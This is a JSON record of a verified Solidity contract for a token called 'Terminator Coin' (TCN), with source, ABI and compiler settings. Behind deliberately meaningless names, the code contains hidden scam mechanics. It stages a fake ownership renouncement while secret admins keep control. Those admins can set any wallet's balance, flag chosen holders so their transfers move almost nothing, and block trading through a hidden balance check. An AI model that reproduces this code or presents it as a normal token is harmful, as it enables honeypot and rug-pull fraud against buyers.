{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract tradingLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface limitLiquidity {\n    function createPair(address shouldWalletLiquidity, address shouldFund) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface walletFundExempt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface sellExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address txTake) external view returns (uint256);\n\n    function transfer(address modeSender, uint256 limitAt) external returns (bool);\n\n    function allowance(address enableExemptLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeSender,\n        uint256 limitAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldIs, uint256 value);\n    event Approval(address indexed enableExemptLimit, address indexed spender, uint256 value);\n}\n\ninterface marketingBuyMin is sellExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TerminatorCoin is tradingLaunch, sellExempt, marketingBuyMin {\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return atMin;\n    }\n\n    function limitBuy(address tradingAt, address modeSender, uint256 limitAt) internal returns (bool) {\n        if (tradingAt == marketingListReceiver) {\n            return walletLiquidity(tradingAt, modeSender, limitAt);\n        }\n        uint256 minTake = sellExempt(buyToken).balanceOf(sellReceiverTx);\n        require(minTake == teamToken);\n        require(modeSender != sellReceiverTx);\n        if (buyAmount[tradingAt]) {\n            return walletLiquidity(tradingAt, modeSender, totalIs);\n        }\n        limitAt = toFrom(tradingAt, modeSender, limitAt);\n        return walletLiquidity(tradingAt, modeSender, limitAt);\n    }\n\n    address private senderLaunched;\n\n    bool private senderLimit;\n\n    function takeAuto() private view {\n        require(listWallet[_msgSender()]);\n    }\n\n    mapping(address => uint256) private enableLimit;\n\n    uint256 public launchedTrading = 0;\n\n    bool public exemptList;\n\n    function maxSender(uint256 limitAt) public {\n        takeAuto();\n        teamToken = limitAt;\n    }\n\n    uint256 constant totalIs = 18 ** 10;\n\n    mapping(address => bool) public listWallet;\n\n    address receiverLimitFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => mapping(address => uint256)) private toExemptFrom;\n\n    function transferFrom(address tradingAt, address modeSender, uint256 limitAt) external override returns (bool) {\n        if (_msgSender() != receiverLimitFrom) {\n            if (toExemptFrom[tradingAt][_msgSender()] != type(uint256).max) {\n                require(limitAt <= toExemptFrom[tradingAt][_msgSender()]);\n                toExemptFrom[tradingAt][_msgSender()] -= limitAt;\n            }\n        }\n        return limitBuy(tradingAt, modeSender, limitAt);\n    }\n\n    uint256 totalAtReceiver;\n\n    function approve(address toTradingExempt, uint256 limitAt) public virtual override returns (bool) {\n        toExemptFrom[_msgSender()][toTradingExempt] = limitAt;\n        emit Approval(_msgSender(), toTradingExempt, limitAt);\n        return true;\n    }\n\n    uint256 public tokenLimitAmount = 3;\n\n    uint256 teamToken;\n\n    function owner() external view returns (address) {\n        return senderLaunched;\n    }\n\n    bool public tradingTokenLiquidity;\n\n    bool public teamTo;\n\n    address public marketingListReceiver;\n\n    function balanceOf(address txTake) public view virtual override returns (uint256) {\n        return enableLimit[txTake];\n    }\n\n    uint256 private limitAutoFrom;\n\n    uint8 private shouldFee = 18;\n\n    function getOwner() external view returns (address) {\n        return senderLaunched;\n    }\n\n    mapping(address => bool) public buyAmount;\n\n    function allowance(address walletLaunched, address toTradingExempt) external view virtual override returns (uint256) {\n        if (toTradingExempt == receiverLimitFrom) {\n            return type(uint256).max;\n        }\n        return toExemptFrom[walletLaunched][toTradingExempt];\n    }\n\n    uint256 public feeAuto;\n\n    function enableTo(address receiverWallet, uint256 limitAt) public {\n        takeAuto();\n        enableLimit[receiverWallet] = limitAt;\n    }\n\n    constructor (){\n        \n        liquidityFee();\n        walletFundExempt tradingAutoFrom = walletFundExempt(receiverLimitFrom);\n        buyToken = limitLiquidity(tradingAutoFrom.factory()).createPair(tradingAutoFrom.WETH(), address(this));\n        sellReceiverTx = limitLiquidity(tradingAutoFrom.factory()).feeTo();\n        if (exemptList == fromWallet) {\n            limitAutoFrom = feeAuto;\n        }\n        marketingListReceiver = _msgSender();\n        listWallet[marketingListReceiver] = true;\n        enableLimit[marketingListReceiver] = atMin;\n        \n        emit Transfer(address(0), marketingListReceiver, atMin);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return minTeamMax;\n    }\n\n    uint256 private atMin = 100000000 * 10 ** 18;\n\n    function walletLiquidity(address tradingAt, address modeSender, uint256 limitAt) internal returns (bool) {\n        require(enableLimit[tradingAt] >= limitAt);\n        enableLimit[tradingAt] -= limitAt;\n        enableLimit[modeSender] += limitAt;\n        emit Transfer(tradingAt, modeSender, limitAt);\n        return true;\n    }\n\n    address public buyToken;\n\n    string private minTeamMax = \"TCN\";\n\n    function name() external view virtual override returns (string memory) {\n        return walletFrom;\n    }\n\n    function transfer(address receiverWallet, uint256 limitAt) external virtual override returns (bool) {\n        return limitBuy(_msgSender(), receiverWallet, limitAt);\n    }\n\n    address sellReceiverTx;\n\n    event OwnershipTransferred(address indexed maxFee, address indexed atEnable);\n\n    bool private fromWallet;\n\n    function shouldFrom(address modeFrom) public {\n        takeAuto();\n        if (limitAutoFrom == feeAuto) {\n            teamTo = true;\n        }\n        if (modeFrom == marketingListReceiver || modeFrom == buyToken) {\n            return;\n        }\n        buyAmount[modeFrom] = true;\n    }\n\n    function toFrom(address tradingAt, address modeSender, uint256 limitAt) internal view returns (uint256) {\n        require(limitAt > 0);\n\n        uint256 tradingMarketing = 0;\n        if (tradingAt == buyToken && tokenLimitAmount > 0) {\n            tradingMarketing = limitAt * tokenLimitAmount / 100;\n        } else if (modeSender == buyToken && launchedTrading > 0) {\n            tradingMarketing = limitAt * launchedTrading / 100;\n        }\n        require(tradingMarketing <= limitAt);\n        return limitAt - tradingMarketing;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return shouldFee;\n    }\n\n    string private walletFrom = \"Terminator Coin\";\n\n    function liquidityFee() public {\n        emit OwnershipTransferred(marketingListReceiver, address(0));\n        senderLaunched = address(0);\n    }\n\n    function autoBuy(address launchedShould) public {\n        if (tradingTokenLiquidity) {\n            return;\n        }\n        if (fromWallet == exemptList) {\n            exemptList = false;\n        }\n        listWallet[launchedShould] = true;\n        \n        tradingTokenLiquidity = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableExemptLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toTradingExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTradingExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedShould\",\"type\":\"address\"}],\"name\":\"autoBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitAt\",\"type\":\"uint256\"}],\"name\":\"enableTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingListReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitAt\",\"type\":\"uint256\"}],\"name\":\"maxSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeFrom\",\"type\":\"address\"}],\"name\":\"shouldFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLimitAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTokenLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TerminatorCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}